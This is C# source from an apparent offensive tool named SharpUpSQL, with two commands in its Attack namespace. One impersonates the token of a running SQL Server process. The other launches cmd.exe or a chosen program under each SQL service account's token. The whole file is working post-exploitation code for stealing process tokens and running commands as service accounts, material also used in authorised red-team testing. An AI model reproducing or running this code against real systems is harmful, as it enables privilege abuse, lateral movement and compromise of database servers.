using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.Security.Principal;
using SharpUpSQL.Commands;
using SharpUpSQL.Common;

namespace SharpUpSQL.Attack
{
    public sealed class InvokeSqlImpersonateServiceCommand : SharpUpSqlCommandBase
    {
        public override string Name { get { return "Invoke-SQLImpersonateService"; } }

        public override IEnumerable<object> Execute(SharpUpSqlContext context)
        {
            if (GetSwitch(context, "Rev2Self"))
            {
                TokenManipulationHelper.Revert();
                yield break;
            }

            var instance = GetArg(context, "Instance");
            if (string.IsNullOrWhiteSpace(instance))
            {
                WriteVerbose(context, "No instance provided.");
                yield break;
            }

            var suppressVerbose = GetSwitch(context, "SuppressVerbose");
            var currentUser = WindowsIdentity.GetCurrent().Name;
            var adminCheck = LocalChecks.GetSqlLocalAdminCheck();
            if (!string.Equals(adminCheck.IsLocalAdmin, "True", StringComparison.OrdinalIgnoreCase))
            {
                WriteVerbose(context, instance + " : " + currentUser + " DOES NOT have local admin privileges.");
                yield break;
            }

            if (!suppressVerbose)
            {
                WriteVerbose(context, instance + " : " + currentUser + " has local admin privileges.");
                WriteVerbose(context, instance + " : Impersonating SQL Server process:");
            }

            var services = GetSqlServiceLocal.Execute(instance, true, true, null)
                .Where(s => s.ServicePath != null &&
                            s.ServicePath.IndexOf("sqlservr.exe", StringComparison.OrdinalIgnoreCase) >= 0)
                .ToList();

            if (services.Count == 0)
            {
                WriteVerbose(context, instance + " : No process running for provided instance...");
                yield break;
            }

            var service = services.First();
            int processId;
            if (!int.TryParse(service.ServiceProcessId, out processId) || processId == 0)
            {
                WriteVerbose(context, instance + " : No process running for provided instance...");
                yield break;
            }

            if (!suppressVerbose)
            {
                WriteVerbose(context, instance + " : - Process ID: " + processId);
                WriteVerbose(context, instance + " : - ServiceAccount: " + service.ServiceAccount);
            }

            if (!TokenManipulationHelper.ImpersonateProcess(processId))
            {
                WriteVerbose(context, instance + " : Impersonation failed.");
                yield break;
            }

            WriteVerbose(context, instance + " : Done.");
        }
    }

    public sealed class InvokeSqlImpersonateServiceCmdCommand : SharpUpSqlCommandBase
    {
        public override string Name { get { return "Invoke-SQLImpersonateServiceCmd"; } }

        public override IEnumerable<object> Execute(SharpUpSqlContext context)
        {
            if (!TokenManipulationHelper.IsAdministrator())
            {
                WriteVerbose(context, "The current user DOES NOT have local administrator privileges. Aborting.");
                yield break;
            }

            WriteVerbose(context, "The current user has local administrator privileges.");
            WriteVerbose(context, "Gathering list of SQL Server services running locally...");

            var instance = GetArg(context, "Instance");
            var engineOnly = GetSwitch(context, "EngineOnly");
            var exe = GetArg(context, "Exe") ?? "cmd.exe";

            IEnumerable<SqlServiceLocalResult> services = GetSqlServiceLocal.Execute(instance, true, false, msg => WriteVerbose(context, msg));
            if (engineOnly)
            {
                services = services.Where(s => s.ServicePath != null &&
                                               s.ServicePath.IndexOf("sqlservr.exe", StringComparison.OrdinalIgnoreCase) >= 0);
                WriteVerbose(context, "Only the database engine service accounts will be targeted.");
            }

            var serviceList = services.OrderBy(s => s.Instance).ToList();
            var processes = GetLocalProcesses();

            WriteVerbose(context, "Gathering list of local processes...");
            WriteVerbose(context, "Targeting SQL Server processes...");

            foreach (var service in serviceList)
            {
                var servicePath = ExtractQuotedPath(service.ServicePath);
                if (string.IsNullOrWhiteSpace(servicePath))
                {
                    continue;
                }

                foreach (var process in processes)
                {
                    if (!string.Equals(servicePath, process.ExecutablePath, StringComparison.OrdinalIgnoreCase))
                    {
                        continue;
                    }

                    Console.WriteLine(
                        service.Instance + " - Service: " + service.ServiceDisplayName +
                        " - Running command \"" + exe + "\" as " + service.ServiceAccount);

                    var launched = TokenManipulationHelper.CreateProcessWithToken(
                        process.ProcessId,
                        "cmd.exe",
                        "/C " + exe);

                    yield return new SqlImpersonateServiceCmdResult
                    {
                        Instance = service.Instance,
                        ServiceDisplayName = service.ServiceDisplayName,
                        ServiceAccount = service.ServiceAccount,
                        Command = exe,
                        Status = launched ? "Started" : "Failed"
                    };
                }
            }

            Console.WriteLine("All done.");
        }

        private static string ExtractQuotedPath(string servicePath)
        {
            if (string.IsNullOrWhiteSpace(servicePath))
            {
                return null;
            }

            var firstQuote = servicePath.IndexOf('"');
            if (firstQuote < 0)
            {
                return servicePath.Split(' ')[0];
            }

            var secondQuote = servicePath.IndexOf('"', firstQuote + 1);
            if (secondQuote <= firstQuote)
            {
                return null;
            }

            return servicePath.Substring(firstQuote + 1, secondQuote - firstQuote - 1);
        }

        private static IList<LocalProcessInfo> GetLocalProcesses()
        {
            var results = new List<LocalProcessInfo>();
            using (var searcher = new ManagementObjectSearcher("SELECT ProcessId, ExecutablePath FROM Win32_Process"))
            {
                foreach (var obj in searcher.Get().Cast<ManagementObject>())
                {
                    using (obj)
                    {
                        var pathObj = obj["ExecutablePath"];
                        var idObj = obj["ProcessId"];
                        if (pathObj == null || idObj == null)
                        {
                            continue;
                        }

                        results.Add(new LocalProcessInfo
                        {
                            ExecutablePath = pathObj.ToString(),
                            ProcessId = Convert.ToInt32(idObj)
                        });
                    }
                }
            }

            return results;
        }

        private sealed class LocalProcessInfo
        {
            public string ExecutablePath { get; set; }
            public int ProcessId { get; set; }
        }
    }
}
